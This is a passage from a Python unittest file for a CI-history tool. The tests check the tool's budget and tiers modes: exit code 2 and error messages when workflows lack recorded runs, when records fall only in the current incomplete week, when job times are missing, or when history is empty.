        self.assertIn("passes once each has a recorded run", err)
        # a tombstone is no recorded run
        recs = {**self.first_night(),
                "smp-stress": [sched_rec("smp-stress", "stress", W1, 1)],
                "macos": [{"workflow": "macos", "tombstone": "gone", "jobs": []}]}
        rc, err = self.budget_cli(recs)
        self.assertEqual(rc, 2)
        self.assertIn("no recorded run of macos.", err)

    def test_passes_once_each_has_a_recorded_run(self) -> None:
        recs = {**self.first_night(),
                "smp-stress": [sched_rec("smp-stress", "stress", W1, 1)],
                "macos": [sched_rec("macos", "check", W1 + timedelta(days=2), 1)]}
        self.assertEqual(self.budget_cli(recs), (0, ""))
        # but not while every record is in the current, incomplete week
        young = {k: [{**r, "jobs": [{**j, "created": iso(W1 + WEEK), "started": iso(W1 + WEEK),
                                     "completed": iso(W1 + WEEK + timedelta(hours=1))}
                                    for j in r["jobs"]]} for r in v]
                 for k, v in recs.items()}
        rc, err = self.budget_cli(young)
        self.assertEqual(rc, 2)
        self.assertIn("no complete week since the history's first scheduled job", err)

    def test_missing_times_exit_2(self) -> None:
        rec = sched_rec("nightly", "kvm", W1, 1)
        rec["jobs"][0]["started"] = None
        history = mock.Mock()
        history.records.return_value = [rec]
        with (
            mock.patch.object(ci_history, "HistoryRepo", return_value=history),
            mock.patch("builtins.print"),
            mock.patch("sys.stderr"),
        ):
            self.assertEqual(ci_history.main(["--budget", "--remote", "x"]), 2)

    def test_no_history_exit_2(self) -> None:
        history = mock.Mock()
        history.records.return_value = []
        for mode in ("--budget", "--tiers"):
            with (
                self.subTest(mode=mode),
                mock.patch.object(ci_history, "HistoryRepo", return_value=history),
                mock.patch("builtins.print"),
                mock.patch("sys.stderr"),
            ):
                self.assertEqual(ci_history.main([mode, "--remote", "x"]), 2)


if __name__ == "__main__":
    unittest.main()
